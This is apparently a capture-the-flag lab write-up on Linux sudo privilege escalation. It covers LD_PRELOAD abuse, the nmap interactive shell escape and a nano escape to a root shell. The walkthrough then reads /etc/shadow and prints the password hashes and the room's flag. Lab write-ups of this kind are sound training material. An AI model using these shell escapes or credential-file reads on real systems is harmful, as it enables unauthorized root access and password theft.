The sudo command allows running programs with root privileges. Administrators can restrict users to running specific commands with elevated rights, which can be checked using sudo -l. The site GTFOBins provides methods to escalate privileges using sudo-allowed programs.
### Privilege Escalation Techniques:
1. Leveraging Application Functions
   - Some applications (e.g., Apache2) can be manipulated to leak sensitive information, such as /etc/ shadow, by exploiting configuration file loading options.
2. Using LD_PRELOAD
   - If the env_keep option is enabled, LD_PRELOAD can load a malicious shared object (.so) file before a program runs.
   - The .so file can execute a root shell by setting user and group IDs to 0.
   - The attack works by compiling a simple C program into a shared object and running it with sudo LD_PRELOAD=/path/to/shell.so find, granting root access.
These techniques demonstrate how misconfigurations in sudo and system environment settings can be exploited for privilege escalation.

### Q.1: How many programs can the user "karen" run on the target system with sudo rights?
We can use the ```sudo -l``` command to see which commands the karen user can run with sudo rights.
```
$ sudo -l
Matching Defaults entries for karen on ip-10-201-43-244:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-201-43-244:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```
We see that there are three commands she can run as sudo: find, less and nano.
### Answer: 3

### Q.2: What is the content of the flag2.txt file?
Let's first see what we can find in our current directory using ls. The /home directory is the most important for us, so let's cd into it.
From there on, when we ls, we can see that there is a singular directory named ubuntu. 

Let's cd into ubuntu via ```cd /home/ubuntu```. When we run the **ls** command we can see that we successfully found the flag2.txt file.
```
$ cd /home/ubuntu
$ ls
flag2.txt
```
Now, we can simply cat flag2.txt and voila, we've found our flag!
```
$ cat flag2.txt
THM-402028394
```
### Answer: THM-402028394
### Q.3: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
This question is similar to the previous one. If you go back to GTFOBins you can find the following page related to nmap:

https://gtfobins.github.io/gtfobins/nmap/#sudo

It describes the following code:
```
sudo nmap --interactive
nmap> !sh
```
Which is the expected answer!
### Answer: sudo nmap -- interactive
### Q.4: What is the hash of frank's password?
When we cd back to root via cd /, and we run the id command, we can see that we do not have root access, thus we will not be able to read Frank's password. 
Run cat /etc/shadow and you will see we cannot get access.
```
$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```
Let's fix that. Run sudo nano and press **CTRL+R** and **CTRL+X**. Enter the following command to gain root access: ```reset; bash 1>&0 2>&0``` and press Enter.
Then we could run the **id** command and see that we have root access.
```uid=0(root) gid=0(root) groups=0(root)```

Now we can go ahead and run ```cat /etc/shadow``` again and would you know it, we can now find Frank's hashed password!
```
ubuntu:!:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
```
There we have frank’s hash:
### Answer: $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
